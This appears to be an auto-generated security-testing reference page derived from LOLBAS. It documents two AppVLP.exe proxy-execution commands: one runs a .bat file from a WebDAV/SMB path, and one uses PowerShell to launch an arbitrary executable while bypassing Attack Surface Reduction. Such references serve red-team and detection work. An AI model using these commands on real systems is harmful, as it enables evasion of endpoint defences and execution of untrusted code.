---
parsed_by: focuslocust
source: commands
type: generated
---
# Appvlp Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Appvlp.exe

Tool page: [Appvlp.exe](../../tools/windows/appvlp.exe.md)

### Execution of BAT file hosted on Webdav server.

```text
AppVLP.exe {PATH_SMB:.bat}
```

Description:

Executes .bat file through AppVLP.exe

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Appvlp.yml` |
| Evidence | Command preserved from source parser. |

### Local execution of process bypassing Attack Surface Reduction (ASR).

```text
AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)"
```

Description:

Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Appvlp.yml` |
| Evidence | Command preserved from source parser. |
